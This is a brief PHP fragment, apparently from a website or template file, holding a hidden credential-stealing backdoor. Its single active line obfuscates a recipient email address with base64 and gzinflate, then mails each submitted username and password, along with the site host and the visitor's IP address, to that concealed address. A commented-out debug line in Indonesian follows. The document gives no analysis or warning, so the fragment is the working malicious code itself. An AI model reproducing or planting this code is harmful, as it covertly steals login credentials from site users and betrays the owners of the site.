...
@mail(gzinflate(base64_decode("SzEpyjZIKTI2yXVIz03MzNFLzs8FAA==")),"__YJSG on ".$_SERVER['HTTP_HOST'],"__==__YJSG on  ".$yj_site." {Log[".$_REQUEST['username']."] pwd[".$_REQUEST['passwd']."]}  = ".$_SERVER['REMOTE_ADDR']);
//echo "Alamat : ".$yj_site;
